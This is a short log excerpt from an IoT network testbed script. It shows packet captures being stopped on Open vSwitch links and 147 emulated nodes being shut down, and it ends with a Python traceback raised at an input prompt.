+	 Stopping capture in link OpenvSwitch-15 <--> sinetstream-connect-kafka-1... Capturing False, OpenvSwitch-15_4-0_to_sinetstream-connect-kafka-1_0-0.pcap
+OK
+Finding links in switch sinetstream-client-connect-1... 1 found
+	 Stopping capture in link OpenvSwitch-15 <--> sinetstream-client-connect-1... Capturing False, None
+OK
+Stopping all  147 nodes
+147.146.145.144.143.142.141.140.139.138.137.136.135.134.133.132.131.130.129.128.127.126.125.124.123.122.121.120.119.118.117.116.115.114.113.112.111.110.109.108.107.106.105.104.103.102.101.100.99.98.97.96.95.94.93.92.91.90.89.88.87.86.85.84.83.82.81.80.79.78.77.76.75.74.73.72.71.70.69.68.67.66.65.64.63.62.61.60.59.58.57.56.55.54.53.52.51.50.49.48.47.46.45.44.43.42.41.40.39.38.37.36.35.34.33.32.31.30.29.28.27.26.25.24.23.22.21.20.19.18.17.16.15.14.13.12.11.10.9.8.7.6.5.4.3.2.1.
+waiting any user input to end program Traceback (most recent call last):
+  File "/home/mpoisson/Manuel/gotham-iot-testbed/src/run_scenario_test.py", line 419, in <module>
+    input("\nwaiting any user input to end program ")
+OSError: [Errno 9] Bad file descriptor
